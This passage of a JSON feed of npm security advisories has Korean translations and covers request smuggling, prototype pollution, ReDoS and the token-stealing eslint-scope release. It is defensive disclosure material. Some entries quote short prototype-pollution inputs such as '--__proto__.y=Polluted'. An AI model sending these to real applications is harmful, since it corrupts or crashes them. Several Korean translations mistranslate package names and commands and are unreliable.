g6rv",
    "name": "llhttp",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.0.7",
    "identifier": "6.0.7",
    "descriptionKR": "Node.js v17.x의 http 모듈에 있는 llhttp 구문 분석기는 Transfer-Encoding 헤더를 올바르게 구문 분석하고 검증하지 않으며 HTTP 요청 밀수(HRS)로 이어질 수 있습니다.\n\n영향:\n\n- 모든 버전의 nodejs 18.x, 16.x 및 14.x 릴리스 라인.\n- llhttp v6.0.7 및 llhttp v2.1.5에는 Node.js 내부에서 업데이트된 수정 사항이 포함되어 있습니다."
  },
  {
    "description": "`sweetalert2` versions 11.6.14 and above have potentially undesirable behavior. The package outputs audio and/or video messages that do not pertain to the functionality of the package when run on specific tlds. This functionality is documented on the project's readme",
    "identifiers": "GHSA : GHSA-mrr8-v49w-3333",
    "severity": "LOW",
    "updatedAt": "2023-07-10T19:08:11Z",
    "publishedAt": "2023-07-10T19:08:10Z",
    "references": "https://github.com/sweetalert2/sweetalert2#important-notice-about-usage-of-this-software-for-ru-su-by-and-%D1%80%D1%84-domain-zones\nhttps://github.com/sweetalert2/sweetalert2/releases/tag/v11.4.9\nhttps://www.npmjs.com/package/sweetalert2\nhttps://github.com/advisories/GHSA-mrr8-v49w-3333",
    "name": "sweetalert2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 11.6.14",
    "descriptionKR": "`sweetalert2` 버전 11.6.14 이상에는 잠재적으로 바람직하지 않은 동작이 있습니다. 패키지는 특정 tld에서 실행될 때 패키지의 기능과 관련되지 않은 오디오 및/또는 비디오 메시지를 출력합니다. 이 기능은 프로젝트의 readme에 문서화되어 있습니다."
  },
  {
    "description": "`sweetalert2` versions 11.4.9 and above are vulnerable to hidden functionality that was introduced by the maintainer. The package outputs audio and/or video messages that do not pertain to the functionality of the package and is not included in versions 11.0.0 - 11.4.8.\n\n### Workaround\nUse a version 11.0.0 - 11.4.8 of the package until the maintainer releases a fix.",
    "identifiers": "GHSA : GHSA-qq6h-5g6j-q3cm",
    "severity": "LOW",
    "updatedAt": "2023-07-10T19:08:08Z",
    "publishedAt": "2022-11-23T15:26:43Z",
    "references": "https://github.com/sweetalert2/sweetalert2/releases/tag/v11.4.9\nhttps://www.npmjs.com/package/sweetalert2\nhttps://github.com/advisories/GHSA-qq6h-5g6j-q3cm",
    "name": "sweetalert2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 11.4.9, < 11.6.14",
    "descriptionKR": "`sweetalert2` 버전 11.4.9 이상은 관리자가 도입한 숨겨진 기능에 취약합니다. 패키지는 패키지의 기능과 관련이 없고 버전 11.0.0 - 11.4.8에 포함되지 않은 오디오 및/또는 비디오 메시지를 출력합니다.\n\n### 해결 방법\n관리자가 수정 사항을 릴리스할 때까지 패키지 버전 11.0.0 - 11.4.8을 사용하십시오."
  },
  {
    "description": "vConsole was discovered to contain a prototype pollution due to incorrect key and value resolution in setOptions in core.ts.",
    "identifiers": "GHSA : GHSA-f737-3fh6-jf6w\nCVE : CVE-2023-30363",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-07T22:20:18Z",
    "publishedAt": "2023-04-26T21:30:37Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-30363\nhttps://github.com/Tencent/vConsole/issues/616\nhttps://cwe.mitre.org/data/definitions/1321.html\nhttps://github.com/Tencent/vConsole/commit/b91591703490e032451f7734212f6458bde9be6a\nhttps://github.com/Tencent/vConsole/releases/tag/v3.15.1\nhttps://github.com/advisories/GHSA-f737-3fh6-jf6w",
    "name": "vconsole",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.15.1",
    "identifier": "3.15.1",
    "descriptionKR": "vConsole은 core.ts의 setOptions에서 잘못된 키 및 값 확인으로 인해 프로토타입 오염을 포함하는 것으로 발견되었습니다."
  },
  {
    "description": "Version 3.7.2 of `eslint-scope` was published without authorization and was found to contain malicious code. This code would read the users `.npmrc` file and send any found authentication tokens to 2 remote servers.\n\n\n## Recommendation\n\nThe best course of action if you found this package installed in your environment is to revoke all your npm tokens. You can find instructions on how to do that here. https://docs.npmjs.com/getting-started/working_with_tokens#how-to-revoke-tokens",
    "identifiers": "GHSA : GHSA-hxxf-q3w9-4xgw",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-07T22:06:02Z",
    "publishedAt": "2018-07-12T19:52:02Z",
    "references": "https://github.com/eslint/eslint-scope/issues/39\nhttps://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes\nhttps://github.com/advisories/GHSA-hxxf-q3w9-4xgw\nhttps://www.npmjs.com/advisories/673\nhttps://snyk.io/vuln/SNYK-JS-ESLINTSCOPE-11120",
    "name": "eslint-scope",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 3.7.2",
    "identifier": "3.7.3",
    "descriptionKR": "`eslint-scope`의 버전 3.7.2가 무단으로 게시되었으며 악성 코드가 포함되어 있는 것으로 밝혀졌습니다. 이 코드는 사용자 `.npmrc` 파일을 읽고 발견된 인증 토큰을 2개의 원격 서버로 보냅니다.\n\n\n## 추천\n\n환경에 이 패키지가 설치되어 있는 경우 가장 좋은 조치는 모든 npm 토큰을 취소하는 것입니다. 여기에서 방법에 대한 지침을 찾을 수 있습니다. https://docs.npmjs.com/getting-started/working_with_tokens#how-to-revoke-tokens"
  },
  {
    "description": "validator.js prior to 13.7.0 is vulnerable to Inefficient Regular Expression Complexity",
    "identifiers": "GHSA : GHSA-qgmg-gppg-76g5\nCVE : CVE-2021-3765",
    "severity": "MODERATE",
    "updatedAt": "2023-07-07T21:50:05Z",
    "publishedAt": "2021-11-03T17:34:45Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-3765\nhttps://github.com/validatorjs/validator.js/commit/496fc8b2a7f5997acaaec33cc44d0b8dba5fb5e1\nhttps://huntr.dev/bounties/c37e975c-21a3-4c5f-9b57-04d63b28cfc9\nhttps://github.com/advisories/GHSA-qgmg-gppg-76g5",
    "name": "validator",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 13.7.0",
    "identifier": "13.7.0",
    "descriptionKR": "13.7.0 이전의 validator.js는 비효율적인 정규식 복잡성에 취약합니다."
  },
  {
    "description": "Versions of the package tough-cookie before 4.1.3 are vulnerable to Prototype Pollution due to improper handling of Cookies when using CookieJar in `rejectPublicSuffixes=false` mode. This issue arises from the manner in which the objects are initialized.",
    "identifiers": "GHSA : GHSA-72xf-g2v4-qvf3\nCVE : CVE-2023-26136",
    "severity": "MODERATE",
    "updatedAt": "2023-07-11T13:44:36Z",
    "publishedAt": "2023-07-01T06:30:16Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26136\nhttps://github.com/salesforce/tough-cookie/issues/282\nhttps://github.com/salesforce/tough-cookie/commit/12d474791bb856004e858fdb1c47b7608d09cf6e\nhttps://github.com/salesforce/tough-cookie/releases/tag/v4.1.3\nhttps://security.snyk.io/vuln/SNYK-JS-TOUGHCOOKIE-5672873\nhttps://lists.debian.org/debian-lts-announce/2023/07/msg00010.html\nhttps://github.com/advisories/GHSA-72xf-g2v4-qvf3",
    "name": "tough-cookie",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.1.3",
    "identifier": "4.1.3",
    "descriptionKR": "4.1.3 이전 버전의 tough-cookie 패키지는 `rejectPublicSuffixes=false` 모드에서 CookieJar를 사용할 때 쿠키를 부적절하게 처리하기 때문에 Prototype Pollution에 취약합니다. 이 문제는 개체가 초기화되는 방식에서 발생합니다."
  },
  {
    "description": "### Summary\n\nOur `meow` dependency (which we use for our CLI) depended on `semver@5.7.1 `. A vulnerability in this version of `semver` was recently identified and surfaced by `npm audit`:\n\nRegular Expression Denial of Service - https://github.com/advisories/GHSA-c2qf-rxjj-qqgw\n\n### Details\n\nOriginal post by the reporter:\n\n\"my npm audit show the report\n\nsemver  <7.5.2\nSeverity: moderate\nsemver vulnerable to Regular Expression Denial of Service - https://github.com/advisories/GHSA-c2qf-rxjj-qqgw\nNo fix available\n\nAnd my dependencies tree for semver show your package\n\n├─┬ stylelint@15.9.0\n│   └─┬ meow@9.0.0\n│        └─┬ read-pkg-up@7.0.1\n│             └─┬ read-pkg@5.2.0\n│                  └─┬ normalize-package-data@2.5.0\n│                       └── semver@5.7.1 deduped\n\nI found that meow@10.x.x contains normalize-package-data@5 and I can fix this vulnerability because it uses semver@7.  But I can't update meow to the new major version because your package doesn't allow it.\"\n\nUpdate your package to use the 'meow' version >=10\"\n\n### PoC\n\nN/A\n\n### Impact\n\nWe anticipate the impact to be low as Stylelint is a dev tool and `meow` is only used on the CLI pathway. \n\n---\n\n⬇️  EDITED AFTER PUBLISHED ⬇️ \n\n### Security fix backported to older `semver` versions\n\nThe same security fix has been backported to older `semver` versions of 5.x and 6.x. See the [CVE-2022-25883](https://github.com/advisories/GHSA-c2qf-rxjj-qqgw) details.\n\nSo, you can fix this vulnerability by just updating `semver` in your project's dependency tree, instead of updating `stylelint`. For details, see the example:\n\n`package.json`:\n\n```json\n{\n  \"dependencies\": {\n    \"stylelint\": \"15.10.0\"\n  }\n}\n```\n\nRun `npm audit` (here is no alert for `semver`):\n\n```console\n$ npm ci\n...\n\n$ npm audit\n...\nstylelint  8.0.0 - 15.10.0\nStylelint has vulnerability in semver dependency - https://github.com/advisories/GHSA-f7xj-rg7h-mc87\nfix available via `npm audit fix --force`\nWill install stylelint@15.10.1, which is outside the stated dependency range\nnode_modules/stylelint\n\n1 low severity vulnerability\n...\n\n$ npm ls semver\n...\n└─┬ stylelint@15.10.0\n  └─┬ meow@9.0.0\n    ├─┬ normalize-package-data@3.0.3\n    │ └── semver@7.5.4\n    └─┬ read-pkg-up@7.0.1\n      └─┬ read-pkg@5.2.0\n        └─┬ normalize-package-data@2.5.0\n          └── semver@5.7.2\n```\n\n",
    "identifiers": "GHSA : GHSA-f7xj-rg7h-mc87",
    "severity": "LOW",
    "updatedAt": "2023-07-13T16:49:53Z",
    "publishedAt": "2023-07-07T20:32:55Z",
    "withdrawnAt": "2023-07-13T16:49:53Z",
    "references": "https://github.com/stylelint/stylelint/security/advisories/GHSA-f7xj-rg7h-mc87\nhttps://github.com/stylelint/stylelint/pull/7043\nhttps://github.com/advisories/GHSA-c2qf-rxjj-qqgw\nhttps://github.com/stylelint/stylelint/releases/tag/15.10.1\nhttps://github.com/advisories/GHSA-f7xj-rg7h-mc87",
    "name": "stylelint",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 8.0.0, < 15.10.1",
    "identifier": "15.10.1",
    "descriptionKR": "### 요약\n\n우리의 `meow` 종속성(CLI에 사용)은 `semver@5.7.1`에 의존했습니다. 이 `semver` 버전의 취약점이 최근 `npm audit`에 의해 식별되고 표면화되었습니다.\n\n정규 표현식 서비스 거부 - https://github.com/advisories/GHSA-c2qf-rxjj-qqgw\n\n### 세부 정보\n\n기자의 원본 게시물:\n\n\"내 npm 감사는 보고서를 보여줍니다\n\n셈버 <7.5.2\n심각도: 보통\n정규식 서비스 거부에 취약한 semver - https://github.com/advisories/GHSA-c2qf-rxjj-qqgw\n사용 가능한 수정 사항 없음\n\n그리고 semver에 대한 내 종속성 트리는 패키지를 보여줍니다.\n\n├─┬ stylelint@15.9.0\n│ └─┬ meow@9.0.0\n│ └─┬ 읽기-pkg-up@7.0.1\n│ └─┬ 읽기-pkg@5.2.0\n│ └─┬ normalize-package-data@2.5.0\n│ └── semver@5.7.1 중복 제거됨\n\nmeow@10.x.x에 normalize-package-data@5가 포함되어 있으며 semver@7을 사용하기 때문에 이 취약점을 수정할 수 있습니다. 하지만 패키지에서 허용하지 않기 때문에 meow를 새로운 주 버전으로 업데이트할 수 없습니다.\"\n\n'야옹' 버전 >=10을 사용하도록 패키지를 업데이트하세요.\"\n\n### PoC\n\n해당 없음\n\n### 영향\n\nStylelint는 개발 도구이고 'meow'는 CLI 경로에서만 사용되므로 영향이 낮을 것으로 예상합니다.\n\n---\n\n⬇️ 출간 후 수정 ⬇️\n\n### 이전 `semver` 버전으로 백포트된 보안 수정\n\n동일한 보안 수정 사항이 이전 `semver` 버전 5.x 및 6.x로 백포트되었습니다. [CVE-2022-25883](https://github.com/advisories/GHSA-c2qf-rxjj-qqgw) 세부 정보를 참조하세요.\n\n따라서 `stylelint`를 업데이트하는 대신 프로젝트의 종속성 트리에서 `semver`를 업데이트하여 이 취약점을 수정할 수 있습니다. 자세한 내용은 다음 예를 참조하십시오.\n\n`패키지.json`:\n\n```json\n{\n  \"종속성\": {\n    \"stylelint\": \"15.10.0\"\n  }\n}\n```\n\n`npm audit`를 실행합니다(여기서는 `semver`에 대한 경고가 없음).\n\n```콘솔\n$ npm CI\n...\n\n$ npm 감사\n...\n스타일린트 8.0.0 - 15.10.0\nStylelint는 semver 의존성에 취약합니다 - https://github.com/advisories/GHSA-f7xj-rg7h-mc87\n`npm audit fix --force`를 통해 수정 가능\n명시된 종속성 범위를 벗어나는 stylelint@15.10.1을 설치합니다.\nnode_modules/stylelint\n\n심각도가 낮은 취약점 1개\n...\n\n$ npm ls 셈버\n...\n└─┬ stylelint@15.10.0\n  └─┬ meow@9.0.0\n    ├─┬ normalize-package-data@3.0.3\n    │ └── semver@7.5.4\n    └─┬ read-pkg-up@7.0.1\n      └─┬ 읽기-pkg@5.2.0\n        └─┬ normalize-package-data@2.5.0\n          └── semver@5.7.2\n```"
  },
  {
    "description": "protobuf.js (aka protobufjs) 6.10.0 until 7.2.4 allows Prototype Pollution, a different vulnerability than CVE-2022-25878. A user-controlled protobuf message can be used by an attacker to pollute the prototype of Object.prototype by adding and overwriting its data and functions. Exploitation can involve: (1) using the function parse to parse protobuf messages on the fly, (2) loading .proto files by using load/loadSync functions, or (3) providing untrusted input to the functions ReflectionObject.setParsedOption and util.setProperty. NOTE: this CVE Record is about `Object.constructor.prototype.<new-property> = ...;` whereas CVE-2022-25878 was about `Object.__proto__.<new-property> = ...;` instead.",
    "identifiers": "GHSA : GHSA-h755-8qp9-cq85\nCVE : CVE-2023-36665",
    "severity": "HIGH",
    "updatedAt": "2023-07-07T20:19:03Z",
    "publishedAt": "2023-07-05T15:30:24Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-36665\nhttps://github.com/protobufjs/protobuf.js/pull/1899\nhttps://github.com/protobufjs/protobuf.js/commit/e66379f451b0393c27d87b37fa7d271619e16b0d\nhttps://github.com/protobufjs/protobuf.js/compare/protobufjs-v7.2.3...protobufjs-v7.2.4\nhttps://github.com/protobufjs/protobuf.js/releases/tag/protobufjs-v7.2.4\nhttps://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665\nhttps://github.com/advisories/GHSA-h755-8qp9-cq85",
    "name": "protobufjs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.10.0, < 7.2.4",
    "identifier": "7.2.4",
    "descriptionKR": "protobuf.js(일명 protobufjs) 6.10.0에서 7.2.4까지는 CVE-2022-25878과 다른 취약점인 Prototype Pollution을 허용합니다. 공격자는 사용자 제어 protobuf 메시지를 사용하여 해당 데이터와 기능을 추가하고 덮어써서 Object.prototype의 프로토타입을 오염시킬 수 있습니다. 악용에는 (1) protobuf 메시지를 즉석에서 구문 분석하기 위해 parse 함수 사용, (2) load/loadSync 함수를 사용하여 .proto 파일 로드 또는 (3) ReflectionObject.setParsedOption 및 util.setProperty 함수에 신뢰할 수 없는 입력 제공이 포함될 수 있습니다. . 참고: 이 CVE 레코드는 `Object.constructor.prototype.<new-property> = ...;`에 관한 것이지만 CVE-2022-25878은 `Object.__proto__.<new-property> = ...;`에 관한 것입니다. ."
  },
  {
    "description": "Versions of `lodash` before 4.17.12 are vulnerable to Prototype Pollution.  The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.12 or later.",
    "identifiers": "GHSA : GHSA-jf85-cpcp-j695\nCVE : CVE-2019-10744",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-07T18:54:15Z",
    "publishedAt": "2019-07-10T19:45:23Z",
    "references": "https://github.com/lodash/lodash/pull/4336\nhttps://nvd.nist.gov/vuln/detail/CVE-2019-10744\nhttps://snyk.io/vuln/SNYK-JS-LODASH-450202\nhttps://www.npmjs.com/advisories/1065\nhttps://access.redhat.com/errata/RHSA-2019:3024\nhttps://security.netapp.com/advisory/ntap-20191004-0005/\nhttps://support.f5.com/csp/article/K47105354?utm_source=f5support&amp;utm_medium=RSS\nhttps://www.oracle.com/security-alerts/cpujan2021.html\nhttps://www.oracle.com/security-alerts/cpuoct2020.html\nhttps://github.com/advisories/GHSA-jf85-cpcp-j695",
    "name": "lodash.defaultsdeep",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.6.1",
    "identifier": "4.6.1",
    "descriptionKR": "4.17.12 이전의 `lodash` 버전은 Prototype Pollution에 취약합니다. `defaultsDeep` 함수는 악의적인 사용자가 `{constructor: {prototype: {...}}}`를 통해 `Object`의 프로토타입을 수정하여 모든 개체에 존재할 기존 속성을 추가하거나 수정할 수 있도록 합니다.\n\n\n\n\n## 추천\n\n버전 4.17.12 이상으로 업데이트하십시오."
  },
  {
    "description": "Versions of `lodash` before 4.17.12 are vulnerable to Prototype Pollution.  The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.12 or later.",
    "identifiers": "GHSA : GHSA-jf85-cpcp-j695\nCVE : CVE-2019-10744",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-07T18:54:15Z",
    "publishedAt": "2019-07-10T19:45:23Z",
    "references": "https://github.com/lodash/lodash/pull/4336\nhttps://nvd.nist.gov/vuln/detail/CVE-2019-10744\nhttps://snyk.io/vuln/SNYK-JS-LODASH-450202\nhttps://www.npmjs.com/advisories/1065\nhttps://access.redhat.com/errata/RHSA-2019:3024\nhttps://security.netapp.com/advisory/ntap-20191004-0005/\nhttps://support.f5.com/csp/article/K47105354?utm_source=f5support&amp;utm_medium=RSS\nhttps://www.oracle.com/security-alerts/cpujan2021.html\nhttps://www.oracle.com/security-alerts/cpuoct2020.html\nhttps://github.com/advisories/GHSA-jf85-cpcp-j695",
    "name": "lodash.mergewith",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.6.2",
    "identifier": "4.6.2",
    "descriptionKR": "4.17.12 이전의 `lodash` 버전은 Prototype Pollution에 취약합니다. `defaultsDeep` 함수는 악의적인 사용자가 `{constructor: {prototype: {...}}}`를 통해 `Object`의 프로토타입을 수정하여 모든 개체에 존재할 기존 속성을 추가하거나 수정할 수 있도록 합니다.\n\n\n\n\n## 추천\n\n버전 4.17.12 이상으로 업데이트하십시오."
  },
  {
    "description": "Versions of `lodash` before 4.17.12 are vulnerable to Prototype Pollution.  The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.12 or later.",
    "identifiers": "GHSA : GHSA-jf85-cpcp-j695\nCVE : CVE-2019-10744",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-07T18:54:15Z",
    "publishedAt": "2019-07-10T19:45:23Z",
    "references": "https://github.com/lodash/lodash/pull/4336\nhttps://nvd.nist.gov/vuln/detail/CVE-2019-10744\nhttps://snyk.io/vuln/SNYK-JS-LODASH-450202\nhttps://www.npmjs.com/advisories/1065\nhttps://access.redhat.com/errata/RHSA-2019:3024\nhttps://security.netapp.com/advisory/ntap-20191004-0005/\nhttps://support.f5.com/csp/article/K47105354?utm_source=f5support&amp;utm_medium=RSS\nhttps://www.oracle.com/security-alerts/cpujan2021.html\nhttps://www.oracle.com/security-alerts/cpuoct2020.html\nhttps://github.com/advisories/GHSA-jf85-cpcp-j695",
    "name": "lodash.merge",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.6.2",
    "identifier": "4.6.2",
    "descriptionKR": "4.17.12 이전의 `lodash` 버전은 Prototype Pollution에 취약합니다. `defaultsDeep` 함수는 악의적인 사용자가 `{constructor: {prototype: {...}}}`를 통해 `Object`의 프로토타입을 수정하여 모든 개체에 존재할 기존 속성을 추가하거나 수정할 수 있도록 합니다.\n\n\n\n\n## 추천\n\n버전 4.17.12 이상으로 업데이트하십시오."
  },
  {
    "description": "Versions of `lodash` before 4.17.12 are vulnerable to Prototype Pollution.  The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.12 or later.",
    "identifiers": "GHSA : GHSA-jf85-cpcp-j695\nCVE : CVE-2019-10744",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-07T18:54:15Z",
    "publishedAt": "2019-07-10T19:45:23Z",
    "references": "https://github.com/lodash/lodash/pull/4336\nhttps://nvd.nist.gov/vuln/detail/CVE-2019-10744\nhttps://snyk.io/vuln/SNYK-JS-LODASH-450202\nhttps://www.npmjs.com/advisories/1065\nhttps://access.redhat.com/errata/RHSA-2019:3024\nhttps://security.netapp.com/advisory/ntap-20191004-0005/\nhttps://support.f5.com/csp/article/K47105354?utm_source=f5support&amp;utm_medium=RSS\nhttps://www.oracle.com/security-alerts/cpujan2021.html\nhttps://www.oracle.com/security-alerts/cpuoct2020.html\nhttps://github.com/advisories/GHSA-jf85-cpcp-j695",
    "name": "lodash.template",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.5.0",
    "identifier": "4.5.0",
    "descriptionKR": "4.17.12 이전의 `lodash` 버전은 Prototype Pollution에 취약합니다. `defaultsDeep` 함수는 악의적인 사용자가 `{constructor: {prototype: {...}}}`를 통해 `Object`의 프로토타입을 수정하여 모든 개체에 존재할 기존 속성을 추가하거나 수정할 수 있도록 합니다.\n\n\n\n\n## 추천\n\n버전 4.17.12 이상으로 업데이트하십시오."
  },
  {
    "description": "Versions of `lodash` before 4.17.12 are vulnerable to Prototype Pollution.  The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.12 or later.",
    "identifiers": "GHSA : GHSA-jf85-cpcp-j695\nCVE : CVE-2019-10744",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-07T18:54:15Z",
    "publishedAt": "2019-07-10T19:45:23Z",
    "references": "https://github.com/lodash/lodash/pull/4336\nhttps://nvd.nist.gov/vuln/detail/CVE-2019-10744\nhttps://snyk.io/vuln/SNYK-JS-LODASH-450202\nhttps://www.npmjs.com/advisories/1065\nhttps://access.redhat.com/errata/RHSA-2019:3024\nhttps://security.netapp.com/advisory/ntap-20191004-0005/\nhttps://support.f5.com/csp/article/K47105354?utm_source=f5support&amp;utm_medium=RSS\nhttps://www.oracle.com/security-alerts/cpujan2021.html\nhttps://www.oracle.com/security-alerts/cpuoct2020.html\nhttps://github.com/advisories/GHSA-jf85-cpcp-j695",
    "name": "lodash-amd",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.17.13",
    "identifier": "4.17.13",
    "descriptionKR": "4.17.12 이전의 `lodash` 버전은 Prototype Pollution에 취약합니다. `defaultsDeep` 함수는 악의적인 사용자가 `{constructor: {prototype: {...}}}`를 통해 `Object`의 프로토타입을 수정하여 모든 개체에 존재할 기존 속성을 추가하거나 수정할 수 있도록 합니다.\n\n\n\n\n## 추천\n\n버전 4.17.12 이상으로 업데이트하십시오."
  },
  {
    "description": "Versions of `lodash` before 4.17.12 are vulnerable to Prototype Pollution.  The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.12 or later.",
    "identifiers": "GHSA : GHSA-jf85-cpcp-j695\nCVE : CVE-2019-10744",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-07T18:54:15Z",
    "publishedAt": "2019-07-10T19:45:23Z",
    "references": "https://github.com/lodash/lodash/pull/4336\nhttps://nvd.nist.gov/vuln/detail/CVE-2019-10744\nhttps://snyk.io/vuln/SNYK-JS-LODASH-450202\nhttps://www.npmjs.com/advisories/1065\nhttps://access.redhat.com/errata/RHSA-2019:3024\nhttps://security.netapp.com/advisory/ntap-20191004-0005/\nhttps://support.f5.com/csp/article/K47105354?utm_source=f5support&amp;utm_medium=RSS\nhttps://www.oracle.com/security-alerts/cpujan2021.html\nhttps://www.oracle.com/security-alerts/cpuoct2020.html\nhttps://github.com/advisories/GHSA-jf85-cpcp-j695",
    "name": "lodash-es",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.17.14",
    "identifier": "4.17.14",
    "descriptionKR": "4.17.12 이전의 `lodash` 버전은 Prototype Pollution에 취약합니다. `defaultsDeep` 함수는 악의적인 사용자가 `{constructor: {prototype: {...}}}`를 통해 `Object`의 프로토타입을 수정하여 모든 개체에 존재할 기존 속성을 추가하거나 수정할 수 있도록 합니다.\n\n\n\n\n## 추천\n\n버전 4.17.12 이상으로 업데이트하십시오."
  },
  {
    "description": "Versions of `lodash` before 4.17.12 are vulnerable to Prototype Pollution.  The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n\n\n\n## Recommendation\n\nUpdate to version 4.17.12 or later.",
    "identifiers": "GHSA : GHSA-jf85-cpcp-j695\nCVE : CVE-2019-10744",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-07T18:54:15Z",
    "publishedAt": "2019-07-10T19:45:23Z",
    "references": "https://github.com/lodash/lodash/pull/4336\nhttps://nvd.nist.gov/vuln/detail/CVE-2019-10744\nhttps://snyk.io/vuln/SNYK-JS-LODASH-450202\nhttps://www.npmjs.com/advisories/1065\nhttps://access.redhat.com/errata/RHSA-2019:3024\nhttps://security.netapp.com/advisory/ntap-20191004-0005/\nhttps://support.f5.com/csp/article/K47105354?utm_source=f5support&amp;utm_medium=RSS\nhttps://www.oracle.com/security-alerts/cpujan2021.html\nhttps://www.oracle.com/security-alerts/cpuoct2020.html\nhttps://github.com/advisories/GHSA-jf85-cpcp-j695",
    "name": "lodash",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.17.12",
    "identifier": "4.17.12",
    "descriptionKR": "4.17.12 이전의 `lodash` 버전은 Prototype Pollution에 취약합니다. `defaultsDeep` 함수는 악의적인 사용자가 `{constructor: {prototype: {...}}}`를 통해 `Object`의 프로토타입을 수정하여 모든 개체에 존재할 기존 속성을 추가하거나 수정할 수 있도록 합니다.\n\n\n\n\n## 추천\n\n버전 4.17.12 이상으로 업데이트하십시오."
  },
  {
    "description": "Affected versions of `minimist` are vulnerable to prototype pollution. Arguments are not properly sanitized, allowing an attacker to modify the prototype of `Object`, causing the addition or modification of an existing property that will exist on all objects.  \nParsing the argument `--__proto__.y=Polluted` adds a `y` property with value `Polluted` to all objects. The argument `--__proto__=Polluted` raises and uncaught error and crashes the application.  \nThis is exploitable if attackers have control over the arguments being passed to `minimist`.\n\n\n\n## Recommendation\n\nUpgrade to versions 0.2.1, 1.2.3 or later.",
    "identifiers": "GHSA : GHSA-vh95-rmgr-6w4m\nCVE : CVE-2020-7598",
    "severity": "MODERATE",
    "updatedAt": "2023-07-07T18:36:02Z",
    "publishedAt": "2020-04-03T21:48:32Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-7598\nhttps://snyk.io/vuln/SNYK-JS-MINIMIST-559764\nhttp://lists.opensuse.org/opensuse-security-announce/2020-06/msg00024.html\nhttps://www.npmjs.com/advisories/1179\nhttps://github.com/minimistjs/minimist/commit/10bd4cdf49d9686d48214be9d579a9cdfda37c68\nhttps://github.com/minimistjs/minimist/commit/38a4d1caead72ef99e824bb420a2528eec03d9ab\nhttps://github.com/minimistjs/minimist/commit/4cf1354839cb972e38496d35e12f806eea92c11f#diff-a1e0ee62c91705696ddb71aa30ad4f95\nhttps://github.com/minimistjs/minimist/commit/63e7ed05aa4b1889ec2f3b196426db4500cbda94\nhttps://github.com/advisories/GHSA-vh95-rmgr-6w4m",
    "name": "minimist",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.0.0, < 1.2.3",
    "identifier": "1.2.3",
    "descriptionKR": "영향을 받은 `minimist` 버전은 프로토타입 오염에 취약합니다. 인수가 제대로 정리되지 않아 공격자가 '객체'의 프로토타입을 수정하여 모든 객체에 존재할 기존 속성을 추가하거나 수정할 수 있습니다.\n인수 `--__proto__.y=Polluted`를 구문 분석하면 값이 `Polluted`인 `y` 속성이 모든 개체에 추가됩니다. 인수 `--__proto__=Polluted`는 잡히지 않은 오류를 발생시키고 애플리케이션을 충돌시킵니다.\n이는 공격자가 `minimist`에 전달되는 인수를 제어할 수 있는 경우 악용될 수 있습니다.\n\n\n\n## 추천\n\n버전 0.2.1, 1.2.3 이상으로 업그레이드하십시오."
  },
  {
    "description": "Affected versions of `minimist` are vulnerable to prototype pollution. Arguments are not properly sanitized, allowing an attacker to modify the prototype of `Object`, causing the addition or modification of an existing property that will exist on all objects.  \nParsing the argument `--__proto__.y=Polluted` adds a `y` property with value `Polluted` to all objects. The argument `--__proto__=Polluted` raises and uncaught error and crashes the application.  \nThis is exploitable if attackers have control over the arguments being passed to `minimist`.\n\n\n\n## Recommendation\n\nUpgrade to versions 0.2.1, 1.2.3 or later.",
    "identifiers": "GHSA : GHSA-vh95-rmgr-6w4m\nCVE : CVE-2020-7598",
    "severity": "MODERATE",
